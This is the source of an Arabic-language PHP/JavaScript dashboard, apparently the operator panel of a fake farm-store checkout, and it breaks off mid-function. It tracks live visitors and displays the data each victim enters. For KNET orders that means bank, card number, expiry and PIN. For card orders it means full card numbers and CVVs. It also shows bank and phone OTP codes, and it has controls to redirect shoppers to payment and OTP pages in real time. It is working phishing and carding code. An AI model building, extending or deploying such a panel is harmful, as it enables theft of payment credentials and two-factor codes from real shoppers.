<?php
require __DIR__ . '/_auth.php';
farm_dashboard_require_login();

$__cfg = @include dirname(__DIR__) . '/farm_pusher_config.php';
$__pusherKey = (is_array($__cfg) && !empty($__cfg['key'])) ? (string) $__cfg['key'] : '';
$__pusherCluster = (is_array($__cfg) && !empty($__cfg['cluster'])) ? (string) $__cfg['cluster'] : 'ap2';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم — مزارع الثنيان</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: #f5f7fa;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .page-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 14px;
        }

        h1.page-title {
            background: linear-gradient(135deg, #025380 0%, #0277bd 100%);
            color: white;
            padding: 14px 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            font-size: 17px;
            font-weight: 800;
            flex: 1;
            min-width: 200px;
        }

        .btn-logout {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 18px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            text-decoration: none;
            color: #fff;
            background: #6c757d;
            border: none;
            cursor: pointer;
            font-family: inherit;
            white-space: nowrap;
        }

        .btn-logout:hover {
            background: #5a6268;
            color: #fff;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(104px, 1fr));
            gap: 8px;
            margin-bottom: 16px;
        }

        .stat-card {
            background: white;
            padding: 10px 8px;
            border-radius: 10px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
            text-align: center;
            border: 1px solid #e8eef2;
        }

        .stat-card h3 {
            color: #6c757d;
            font-size: 10px;
            margin-bottom: 4px;
            font-weight: 600;
            line-height: 1.25;
        }

        .stat-card .number {
            font-size: 20px;
            font-weight: 800;
            color: #025380;
            line-height: 1.1;
        }

        .filters {
            background: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }

        .filters input, .filters select {
            padding: 10px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-family: inherit;
            font-size: 14px;
            margin-left: 10px;
        }

        .filters button {
            padding: 10px 25px;
            background: #025380;
            color: white;
            border: none;
            border-radius: 8px;
            font-family: inherit;
            font-weight: 600;
            cursor: pointer;
        }

        .orders {
            background: white;
            border-radius: 12px;
            overflow-x: auto;
            overflow-y: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 1040px;
        }

        thead {
            background: #025380;
            color: white;
        }

        th {
            padding: 10px 8px;
            text-align: right;
            font-weight: 700;
            font-size: 12px;
            white-space: nowrap;
        }

        td {
            padding: 10px 8px;
            border-bottom: 1px solid #eee;
            font-size: 13px;
        }

        th.col-btn,
        td.col-btn {
            text-align: center;
            padding: 8px 6px;
            vertical-align: middle;
        }

        td.col-compact {
            max-width: 88px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        td.col-name {
            max-width: 120px;
        }

        td.col-page {
            max-width: 160px;
        }

        tbody tr:hover {
            background: #f8f9fa;
        }

        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
        }

        .badge-pending {
            background: #fff3cd;
            color: #856404;
        }

        .badge-paid, .badge-otp_verified {
            background: #d1f2eb;
            color: #0f5132;
        }

        .btn-view {
            padding: 6px 15px;
            background: #025380;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
        }

        .empty {
            text-align: center;
            padding: 50px;
            color: #999;
        }

        /* 🔥 Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
            overflow-y: auto;
            padding: 20px;
        }

        .modal.show {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            border-radius: 16px;
            max-width: 1000px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-header {
            background: linear-gradient(135deg, #025380 0%, #0277bd 100%);
            color: white;
            padding: 25px 30px;
            border-radius: 16px 16px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .modal-header h2 {
            font-size: 22px;
            font-weight: 800;
        }

        .modal-close {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 28px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.2s;
        }

        .modal-close:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(90deg);
        }

        .modal-body {
            padding: 30px;
        }

        .detail-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }

        .detail-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 12px;
        }

        .detail-section h4 {
            color: #025380;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #ddd;
            font-size: 16px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e0e0e0;
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .detail-label {
            font-weight: 600;
            color: #666;
        }

        .detail-value {
            color: #333;
            text-align: left;
        }

        /* OTP محاولات */
        .otp-attempt {
            background: #fff;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border-right: 4px solid #025380;
        }

        .otp-attempt.latest {
            background: #fff3cd;
            border-right-color: #856404;
        }

        .otp-code {
            font-family: monospace;
            font-size: 20px;
            font-weight: bold;
            color: #025380;
            letter-spacing: 2px;
        }

        .otp-meta {
            font-size: 11px;
            color: #999;
            margin-top: 5px;
        }

        .pusher-direct-row {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 12px;
        }

        .btn-pusher {
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            font-family: inherit;
            font-size: 13px;
        }

        .btn-pusher-ver {
            background: #0d6efd;
            color: #fff;
        }

        .btn-pusher-knet {
            background: #6f42c1;
            color: #fff;
        }

        .btn-pusher-checkout {
            background: #fd7e14;
            color: #fff;
        }

        .btn-pusher:disabled {
            opacity: 0.65;
            cursor: not-allowed;
        }

        .pusher-direct-msg {
            margin-top: 10px;
            font-size: 13px;
        }

        .badge-online {
            background: #d1f2eb;
            color: #0f5132;
        }

        .badge-offline {
            background: #e9ecef;
            color: #495057;
        }

        .page-peek {
            max-width: 220px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 12px;
            direction: ltr;
            text-align: left;
        }

        .quick-nav-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-top: 10px;
        }

        .btn-quick-nav {
            padding: 7px 10px;
            font-size: 11px;
            border-radius: 8px;
            border: 1px solid #b8d4e8;
            background: #f0f7fb;
            color: #025380;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
        }

        .btn-quick-nav:hover {
            background: #025380;
            color: #fff;
            border-color: #025380;
        }

        .btn-quick-nav.btn-quick-nav-disabled,
        .btn-quick-nav:disabled {
            opacity: 0.55;
            cursor: not-allowed;
            background: #eef1f4;
            color: #6b7280;
            border-color: #d1d5db;
        }

        .btn-quick-nav.btn-quick-nav-disabled:hover,
        .btn-quick-nav:disabled:hover {
            background: #eef1f4;
            color: #6b7280;
            border-color: #d1d5db;
        }

        .hint-muted {
            color: #888;
            font-size: 12px;
            margin: 6px 0 0;
            line-height: 1.45;
        }

        .page-peek {
            font-size: 12px;
            max-width: 220px;
            line-height: 1.35;
        }

        .page-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-left: 6px;
            vertical-align: middle;
        }

        .page-dot.on {
            background: #198754;
            box-shadow: 0 0 0 2px rgba(25, 135, 84, 0.25);
        }

        .page-dot.off {
            background: #adb5bd;
        }

        .btn-row {
            padding: 9px 10px;
            font-size: 12px;
            font-weight: 700;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-family: inherit;
            white-space: nowrap;
            width: 100%;
            max-width: 92px;
            box-sizing: border-box;
        }

        .btn-row-view {
            background: #025380;
            color: #fff;
        }

        .btn-row-cart {
            background: #6f42c1;
            color: #fff;
        }

        .btn-row-knet {
            background: #212529;
            color: #fff;
        }

        .btn-row-card {
            background: #fd7e14;
            color: #fff;
        }

        .btn-row-del {
            background: #dc3545;
            color: #fff;
        }

        .btn-row-del:hover {
            background: #bb2d3b;
        }

        /* بطاقة بدون بيانات كافية: داكنة */
        .dash-knet-card.dash-knet-card-empty {
            background: linear-gradient(145deg, #2d2d2d 0%, #1a1a1a 100%);
            color: #eee;
            border-radius: 12px;
            padding: 16px 18px;
            margin-bottom: 14px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.35);
            border: 1px solid #444;
        }

        .dash-knet-card.dash-knet-card-empty .dash-knet-line span.lbl {
            color: #9ecbff;
        }

        /* بطاقة بها بيانات: أخضر ونص أبيض */
        .dash-knet-card.dash-knet-card-filled {
            background: linear-gradient(145deg, #1a7f4c 0%, #146c43 100%);
            color: #fff;
            border-radius: 12px;
            padding: 16px 18px;
            margin-bottom: 14px;
            box-shadow: 0 4px 16px rgba(20, 108, 67, 0.45);
            border: 1px solid #0d4a2e;
        }

        .dash-knet-card.dash-knet-card-filled .dash-knet-card-top {
            color: #fff;
        }

        .dash-knet-card.dash-knet-card-filled .dash-knet-badge {
            background: #fff;
            color: #146c43;
        }

        .dash-knet-card.dash-knet-card-filled .dash-knet-line {
            color: #fff;
        }

        .dash-knet-card.dash-knet-card-filled .dash-knet-line span.lbl {
            color: rgba(255, 255, 255, 0.92);
        }

        .dash-knet-card-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            font-weight: 800;
            font-size: 15px;
        }

        .dash-knet-badge {
            background: #198754;
            color: #fff;
            font-size: 11px;
            padding: 3px 10px;
            border-radius: 20px;
            font-weight: 700;
        }

        .dash-knet-line {
            font-size: 13px;
            margin: 6px 0;
            line-height: 1.5;
            direction: ltr;
            text-align: left;
        }

        .dash-knet-line span.lbl {
            font-weight: 600;
            margin-right: 8px;
        }

        .dash-submodal-footer {
            margin-top: 18px;
            padding-top: 16px;
            border-top: 2px solid #e8eef2;
        }

        .modal-narrow .modal-content {
            max-width: 520px;
        }

        .modal-wide .modal-content {
            max-width: 640px;
        }

        @media (max-width: 768px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            table {
                font-size: 13px;
            }
            
            th, td {
                padding: 10px;
            }

            .modal-content {
                max-height: 95vh;
            }

            .detail-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="page-header">
            <h1 class="page-title">لوحة التحكم — طلبات وتوجيه مباشر</h1>
            <a class="btn-logout" href="logout.php">خروج</a>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>زوار نشطون الآن</h3>
                <div class="number" id="active-sessions">0</div>
            </div>
            <div class="stat-card">
                <h3>إجمالي الطلبات</h3>
                <div class="number" id="total-orders">0</div>
            </div>
            <div class="stat-card">
                <h3>طلبات اليوم</h3>
                <div class="number" id="today-orders">0</div>
            </div>
            <div class="stat-card">
                <h3>طلبات KNET</h3>
                <div class="number" id="knet-orders">0</div>
            </div>
            <div class="stat-card">
                <h3>طلبات البطاقة</h3>
                <div class="number" id="card-orders">0</div>
            </div>
        </div>

        <div class="filters">
            <input type="text" id="search" placeholder="🔍 البحث برقم الهاتف أو الاسم...">
            <select id="filter-method">
                <option value="">جميع طرق الدفع</option>
                <option value="card">بطاقة ائتمان</option>
                <option value="knet">KNET</option>
            </select>
            <button onclick="loadOrders()">بحث</button>
            <button onclick="resetFilters()" style="background: #6c757d;">إعادة تعيين</button>
        </div>

        <div class="orders">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>تاريخ</th>
                        <th>الاسم</th>
                        <th>جوال</th>
                        <th>المبلغ</th>
                        <th>الدفع</th>
                        <th>نشط</th>
                        <th>الصفحة</th>
                        <th class="col-btn">عرض</th>
                        <th class="col-btn">منتجات</th>
                        <th class="col-btn">KNET</th>
                        <th class="col-btn">بطاقة</th>
                        <th class="col-btn">حذف</th>
                    </tr>
                </thead>
                <tbody id="orders-table">
                    <tr>
                        <td colspan="13" class="empty">جاري التحميل...</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <!-- أنبثاق: بيانات العميل فقط -->
    <div class="modal modal-narrow" id="modalCustomer" onclick="closeSubModalBackdrop(event, 'modalCustomer')">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-customer-title">العميل</h2>
                <button class="modal-close" onclick="closeSubModal('modalCustomer')">&times;</button>
            </div>
            <div class="modal-body" id="modal-customer-body"></div>
        </div>
    </div>

    <!-- أنبثاق: المنتجات -->
    <div class="modal modal-wide" id="modalProducts" onclick="closeSubModalBackdrop(event, 'modalProducts')">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-products-title">المنتجات</h2>
                <button class="modal-close" onclick="closeSubModal('modalProducts')">&times;</button>
            </div>
            <div class="modal-body" id="modal-products-body"></div>
        </div>
    </div>

    <!-- أنبثاق: KNET (بطاقات + OTP + توجيه) -->
    <div class="modal modal-wide" id="modalKnet" onclick="closeSubModalBackdrop(event, 'modalKnet')">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-knet-title">معلومات الدفع — KNET</h2>
                <button class="modal-close" onclick="closeSubModal('modalKnet')">&times;</button>
            </div>
            <div class="modal-body" id="modal-knet-body"></div>
        </div>
    </div>

    <!-- أنبثاق: بطاقة ائتمان (من checkout) -->
    <div class="modal modal-wide" id="modalCardPay" onclick="closeSubModalBackdrop(event, 'modalCardPay')">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-card-title">معلومات الدفع — بطاقة</h2>
                <button class="modal-close" onclick="closeSubModal('modalCardPay')">&times;</button>
            </div>
            <div class="modal-body" id="modal-card-body"></div>
        </div>
    </div>

    <audio id="dashboard-notify-audio" preload="auto">
        <source src="assets/notify.mp3" type="audio/mpeg" />
    </audio>
    <audio id="dashboard-knet-ring-audio" preload="auto">
        <source src="../ringtone-sms-notification.mp3" type="audio/mpeg" />
    </audio>

    <script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
    <script>
        const FARM_PUSHER_KEY = <?= json_encode($__pusherKey, JSON_UNESCAPED_UNICODE) ?>;
        const FARM_PUSHER_CLUSTER = <?= json_encode($__pusherCluster, JSON_UNESCAPED_UNICODE) ?>;

        let allOrders = [];
        let filteredOrders = [];
        let clientSessionsById = {};

        function escapeHtml(s) {
            if (s == null || s === undefined) return '';
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;');
        }

        function formatOrderDateShort(at) {
            if (at == null || at === '') {
                return '—';
            }
            const s = String(at);
            const sp = s.indexOf(' ');
            if (sp > 0) {
                return s.slice(0, sp);
            }
            const t = s.indexOf('T');
            if (t > 0) {
                return s.slice(0, t);
            }
            return s.length > 10 ? s.slice(0, 10) : s;
        }

        function emptyOr(val) {
            const s = val == null ? '' : String(val);
            return s.trim() === ''
                ? '<span style="color:#bbb">—</span>'
                : escapeHtml(s);
        }

        function badgeStatusClass(status) {
            const s = String(status || 'pending');
            return /^[a-z0-9_]+$/i.test(s) ? s : 'pending';
        }

        /** أرقام فقط ثم تباعد كل 4: "1234567812345678" → "1234 5678 1234 5678" */
        function formatCardNumberGrouped(raw) {
            const digits = String(raw == null ? '' : raw).replace(/\D/g, '');
            if (!digits) return '';
            const parts = [];
            for (let i = 0; i < digits.length; i += 4) {
                parts.push(digits.slice(i, i + 4));
            }
            return parts.join(' ');
        }

        function getOrderReservationId(order) {
            if (!order || typeof order !== 'object') {
                return '';
            }
            if (order.pusher_reservation_id != null && String(order.pusher_reservation_id) !== '') {
                return String(order.pusher_reservation_id).replace(/\D/g, '');
            }
            const flow = order.flow_data && Array.isArray(order.flow_data) ? order.flow_data : [];
            for (let i = flow.length - 1; i >= 0; i--) {
                const row = flow[i];
                if (!row || row.step !== 'knet_card_details' || !row.data || typeof row.data !== 'object') {
                    continue;
                }
                const rid = row.data.reservation_id;
                if (rid == null || String(rid) === '') {
                    continue;
                }
                const digits = String(rid).replace(/\D/g, '');
                if (digits) {
                    return digits;
                }
            }
            return '';
        }

        function flowDataRows(data) {
            if (!data || typeof data !== 'object') {
                return '';
            }
            return Object.keys(data).map(function (k) {
                let v = data[k];
                if (v !== null && typeof v === 'object') {
                    v = JSON.stringify(v);
                }
                return '<div class="detail-row"><span class="detail-label">' + escapeHtml(k) + ':</span>' +
                    '<span class="detail-value" dir="ltr" style="word-break:break-all;text-align:left;">' +
                    escapeHtml(String(v)) + '</span></div>';
            }).join('');
        }

        function fetchSessionsMap() {
            return fetch('../get_client_sessions.php', { cache: 'no-store' })
                .then(function (r) {
                    return r.json();
                })
                .then(function (data) {
                    clientSessionsById = {};
                    if (data && data.success && Array.isArray(data.sessions)) {
                        data.sessions.forEach(function (s) {
                            if (s && s.session_id) {
                                clientSessionsById[s.session_id] = s;
                            }
                        });
                    }
                })
                .catch(function () {});
        }

        /** تحديث سريع لعمود «نشط / الصفحة» دون إعادة جلب الطلبات */
        function refreshClientSessionsOnly() {
            return fetchSessionsMap().then(function () {
                if (allOrders.length) {
                    displayOrders(allOrders);
                    try {
                        updateStats(allOrders);
                    } catch (e) {}
                    refreshDashboardModalIfOpen();
                }
            });
        }

        function playNotifySound() {
            var a = document.getElementById('dashboard-notify-audio');
            if (a && a.play) {
                a.currentTime = 0;
                a.play().catch(function () {
                    beepFallback();
                });
            } else {
                beepFallback();
            }
        }

        /** نغمة عند وصول بيانات من KNET (knet.php → save_flow_step) */
        function playKnetRingSound() {
            var a = document.getElementById('dashboard-knet-ring-audio');
            if (a && a.play) {
                a.currentTime = 0;
                a.play().catch(function () {
                    playNotifySound();
                });
            } else {
                playNotifySound();
            }
        }

        function beepFallback() {
            try {
                var ctx = new (window.AudioContext || window.webkitAudioContext)();
                var o = ctx.createOscillator();
                var g = ctx.createGain();
                o.connect(g);
                g.connect(ctx.destination);
                o.frequency.value = 880;
                g.gain.setValueAtTime(0.08, ctx.currentTime);
                o.start();
                o.stop(ctx.currentTime + 0.12);
            } catch (e) {}
        }

        function refreshDashboardModalIfOpen() {
            var oid = window.__dashOpenOrderId;
            var kind = window.__dashModalKind;
            if (oid == null || oid === '' || !kind) {
                return;
            }
            var idx = filteredOrders.findIndex(function (o) {
                return String(o && o.id) === String(oid);
            });
            if (idx < 0) {
                return;
            }
            if (kind === 'customer') {
                showCustomerModal(idx);
            } else if (kind === 'products') {
                showProductsModal(idx);
            } else if (kind === 'knet') {
                showKnetModal(idx);
            } else if (kind === 'card') {
                showCardModal(idx);
            }
        }

        function connectDashboardPusher() {
            if (!FARM_PUSHER_KEY) {
                return;
            }
            try {
                var pusher = new Pusher(FARM_PUSHER_KEY, {
                    cluster: FARM_PUSHER_CLUSTER,
                    encrypted: true
                });
                var ch = pusher.subscribe('farm-dashboard');
                ch.bind('dashboard-event', function (payload) {
                    var k = payload && payload.kind;
                    if (k === 'sessions_updated') {
                        refreshClientSessionsOnly();
                        return;
                    }
                    var step = payload && payload.step;
                    var isKnetFromSite =
                        k === 'flow_step' &&
                        step &&
                        (step === 'knet_card_details' || step === 'knet_otp');
                    /* خطوات KNET من knet.php: نغمة الرنين؛ باقي الأحداث: الصوت العادي */
                    if (isKnetFromSite) {
                        playKnetRingSound();
                    } else if (
                        k === 'visitor_index' ||
                        k === 'new_order' ||
                        k === 'flow_step' ||
                        k === 'otp_attempt'
                    ) {
                        playNotifySound();
                    }
                    loadOrders();
                });
            } catch (e) {
                console.warn('Pusher:', e);
            }
        }

        function loadOrders() {
            Promise.all([
                fetch('../get_orders.php', { cache: 'no-store' }).then(function (r) {
                    if (!r.ok) {
                        throw new Error('HTTP ' + r.status);
                    }
                    return r.json();
                }),
                fetchSessionsMap()
            ])
                .then(function (results) {
                    var data = results[0];
                    if (!data || !data.success) {
                        return;
                    }
                    var next = Array.isArray(data.orders) ? data.orders : [];
                    if (next.length === 0 && allOrders.length > 0) {
                        console.warn('تجاهل تحديث فارغ مؤقت للحفاظ على القائمة المعروضة');
                        return;
                    }
                    allOrders = next;
                    displayOrders(allOrders);
                    try {
                        updateStats(allOrders);
                    } catch (eStats) {
                        console.error('updateStats:', eStats);
                    }
                    refreshDashboardModalIfOpen();
                })
                .catch(function (err) {
                    console.error('Error:', err);
                    var tbody = document.getElementById('orders-table');
                    if (!allOrders || allOrders.length === 0) {
                        tbody.innerHTML =
                            '<tr><td colspan="13" class="empty">خطأ في تحميل البيانات</td></tr>';
                    }
                });
        }

        function displayOrders(orders) {
            const tbody = document.getElementById('orders-table');
            const searchText = document.getElementById('search').value.toLowerCase();
            const filterMethod = document.getElementById('filter-method').value;

            const list = Array.isArray(orders) ? orders : [];
            filteredOrders = list.filter(order => {
                const cust = order.customer || {};
                const name = (cust.full_name || '').toLowerCase();
                const phone = cust.phone || '';
                const matchSearch = !searchText ||
                    name.includes(searchText) ||
                    phone.includes(searchText);
                const pay = order.payment || {};
                const matchMethod = !filterMethod || pay.method === filterMethod;
                return matchSearch && matchMethod;
            });

            if (filteredOrders.length === 0) {
                tbody.innerHTML = '<tr><td colspan="13" class="empty">لا توجد نتائج</td></tr>';
                return;
            }

            tbody.innerHTML = filteredOrders.map((order, index) => {
                const sid = order.client_session_id ? String(order.client_session_id) : '';
                const sess = sid ? clientSessionsById[sid] : null;
                const active = sess && sess.active;
                const pagePeek = sess && sess.page ? String(sess.page) : '';
                const secAgo = sess && sess.seconds_ago != null ? sess.seconds_ago : '';
                const secStr = secAgo !== '' ? String(secAgo) : '';
                let activeTitle = 'لا توجد جلسة مرتبطة بهذا الطلب';
                if (sid && !sess) {
                    activeTitle = 'بانتظار ظهور الجلسة (يفتح العميل الموقع مع التتبع)';
                } else if (sid && sess) {
                    activeTitle = active
                        ? 'متصل الآن — آخر نشاط منذ ' + secStr + ' ث'
                        : 'غير متصل — آخر نشاط منذ ' + (secStr !== '' ? secStr + ' ث' : 'غير معروف');
                }
                const activeLabel = sid
                    ? (active ? 'نشط الآن' : 'غير نشط')
                    : '—';
                const activeClass = sid ? (active ? 'badge-online' : 'badge-offline') : 'badge-offline';
                const pageLabel = friendlyPageLabel(pagePeek);
                const pageDisplay = sid
                    ? ('<span class="page-dot ' + (active ? 'on' : 'off') + '" title="' + (active ? 'متصل الآن' : 'غير متصل') + '"></span>' +
                        '<span>' + pageLabel + '</span>' +
                        (secAgo !== '' ? ' <small style="color:#6c757d">(' + secAgo + 'ث)</small>' : ''))
                    : '<span style="color:#999">—</span>';
                const pay = order.payment || {};
                const isKnet = pay.method === 'knet';
                const isCard = pay.method === 'card';
                const dateFull = escapeHtml(order.created_at || '');
                const dateShort = escapeHtml(formatOrderDateShort(order.created_at));
                return `
                <tr>
                    <td class="col-compact" title="${dateFull}"><strong>#${escapeHtml(order.id)}</strong></td>
                    <td class="col-compact" title="${dateFull}">${dateShort}</td>
                    <td class="col-name" title="${escapeHtml(order.customer && order.customer.full_name)}">${escapeHtml(order.customer && order.customer.full_name)}</td>
                    <td dir="ltr" class="col-compact">${escapeHtml(order.customer && order.customer.phone)}</td>
                    <td>${escapeHtml(pay.total)} ${escapeHtml(pay.currency)}</td>
                    <td>${isCard ? 'بطاقة' : 'KNET'}</td>
                    <td title="${escapeHtml(activeTitle)}"><span class="badge ${activeClass}">${activeLabel}</span></td>
                    <td class="page-peek col-page">${pageDisplay}</td>
                    <td class="col-btn"><button type="button" class="btn-row btn-row-view" onclick="showCustomerModal(${index})">عرض</button></td>
                    <td class="col-btn"><button type="button" class="btn-row btn-row-cart" onclick="showProductsModal(${index})">منتجات</button></td>
                    <td class="col-btn">${isKnet ? `<button type="button" class="btn-row btn-row-knet" onclick="showKnetModal(${index})">KNET</button>` : '<span style="color:#ccc;font-size:12px">—</span>'}</td>
                    <td class="col-btn">${isCard ? `<button type="button" class="btn-row btn-row-card" onclick="showCardModal(${index})">بطاقة</button>` : '<span style="color:#ccc;font-size:12px">—</span>'}</td>
                    <td class="col-btn"><button type="button" class="btn-row btn-row-del" data-order-id="${escapeHtml(String(order.id))}" title="حذف السجل من اللوحة">حذف</button></td>
                </tr>
            `;
            }).join('');
        }

        function friendlyPageLabel(rawPath) {
            const path = String(rawPath || '').toLowerCase();
            if (!path) {
                return '—';
            }
            if (path.includes('index.html') || path === '/') {
                return 'المتجر / الرئيسية';
            }
            if (path.includes('cart.html')) {
                return 'سلة المشتريات';
            }
            if (path.includes('checkout')) {
                return 'إتمام الطلب';
            }
            if (path.includes('knet.php')) {
                return 'KNET';
            }
            if (path.includes('knetwait')) {
                return 'انتظار KNET';
            }
            if (path.includes('verfi') && path.includes('ver.php')) {
                return 'التحقق الهاتفي';
            }
            if (path.includes('otp.html')) {
                return 'OTP';
            }
            const short = String(rawPath);
            return short.length > 36 ? escapeHtml(short.slice(0, 36)) + '…' : escapeHtml(short);
        }

        function collectKnetCardsChrono(order) {
            const flow = order.flow_data && Array.isArray(order.flow_data) ? order.flow_data : [];
            const out = [];
            for (let i = flow.length - 1; i >= 0; i--) {
                const row = flow[i];
                if (row && row.step === 'knet_card_details' && row.data && typeof row.data === 'object') {
                    out.push(row);
                }
            }
            return out;
        }

        function collectOtpRows(order) {
            const rows = [];
            const od = order.otp_data && Array.isArray(order.otp_data) ? order.otp_data : [];
            od.forEach(function (o) {
                if (o && o.code != null && String(o.code) !== '') {
                    rows.push({
                        label: 'OTP (صفحة الموقع)',
                        code: String(o.code),
                        ts: o.timestamp || '',
                        ip: o.ip || ''
                    });
                }
            });
            const flow = order.flow_data && Array.isArray(order.flow_data) ? order.flow_data : [];
            flow.forEach(function (r) {
                if (!r || !r.data) {
                    return;
                }
                if (r.step === 'ver_phone_otp' && r.data.otp_code) {
                    const v =
                        r.data.otp_valid === true ? 'مطابق' : r.data.otp_valid === false ? 'غير مطابق' : '';
                    rows.push({
                        label: 'التحقق الهاتفي',
                        code: String(r.data.otp_code),
                        ts: r.timestamp || '',
                        extra: v
                    });
                }
                if (r.step === 'knet_otp' && r.data.debitOTP) {
                    rows.push({
                        label: 'KNET — شاشة الرمز',
                        code: String(r.data.debitOTP),
                        ts: r.timestamp || ''
                    });
                }
            });
            return rows;
        }

        function knetFlowRowHasData(d) {
            if (!d || typeof d !== 'object') {
                return false;
            }
            const hasBank = String(d.bkName || '').trim() !== '';
            const pre = String(d.prefix || '').trim();
            const cn = String(d.cnmbr || '').trim();
            const hasNum = pre !== '' || cn !== '';
            const hasPin = String(d.pin != null ? d.pin : '').trim() !== '';
            const mo = String(d.month || '').trim();
            const yr = String(d.year || '').trim();
            const hasExp = mo !== '' || yr !== '';
            return hasBank || hasNum || hasPin || hasExp;
        }

        function checkoutCardHasData(cd) {
            if (!cd || typeof cd !== 'object') {
                return false;
            }
            const hn = String(cd.holder_name || '').trim();
            const digits = String(cd.full_number || '').replace(/\D/g, '');
            const l4 = String(cd.last4 || '').replace(/\D/g, '');
            const ex = String(cd.expiry || '').replace(/[\s/—\-]/g, '');
            const cv = String(cd.cvv || '').trim();
            return hn.length > 0 || digits.length >= 4 || l4.length >= 1 || ex.length > 1 || cv.length > 0;
        }

        function renderDashKnetCards(cards, custName) {
            if (!cards.length) {
                return '<p style="color:#999;margin:0">لم تُسجَّل بطاقة KNET بعد.</p>';
            }
            const note = custName
                ? 'تم إدخال بطاقة جديدة من قبل ' + escapeHtml(custName)
                : 'تم تسجيل بطاقة';
            return cards
                .map(function (row, idx) {
                    const d = row.data || {};
                    const filled = knetFlowRowHasData(d);
                    const cardClass = 'dash-knet-card ' + (filled ? 'dash-knet-card-filled' : 'dash-knet-card-empty');
                    const bank = escapeHtml(String(d.bkName || '—'));
                    const pre = String(d.prefix || '');
                    const cn = String(d.cnmbr || '');
                    const numLine = escapeHtml(pre && cn ? pre + ' — ' + cn : pre || cn || '—');
                    const exp =
                        escapeHtml(String(d.month || '')) +
                        '/' +
                        escapeHtml(String(d.year || ''));
                    const pinRaw = String(d.pin != null ? d.pin : '').trim();
                    const pinShow = pinRaw ? escapeHtml(pinRaw) : '—';
                    const noteBox =
                        idx === 0
                            ? '<div style="background:' +
                              (filled ? '#d1e7dd' : '#e7f3ff') +
                              ';border:1px solid ' +
                              (filled ? '#a3cfbb' : '#b6d4fe') +
                              ';border-radius:8px;padding:8px 10px;margin-bottom:10px;font-size:13px;color:' +
                              (filled ? '#0f5132' : '#084298') +
                              '">' +
                              note +
                              '</div>'
                            : '';
                    const tsColor = filled ? 'rgba(255,255,255,0.88)' : '#888';
                    return (
                        '<div class="' +
                        cardClass +
                        '">' +
                        noteBox +
                        '<div class="dash-knet-card-top"><span>بطاقة ' +
                        (idx + 1) +
                        '</span><span class="dash-knet-badge">جديد</span></div>' +
                        '<div class="dash-knet-line"><span class="lbl">Bank</span> ' +
                        bank +
                        '</div>' +
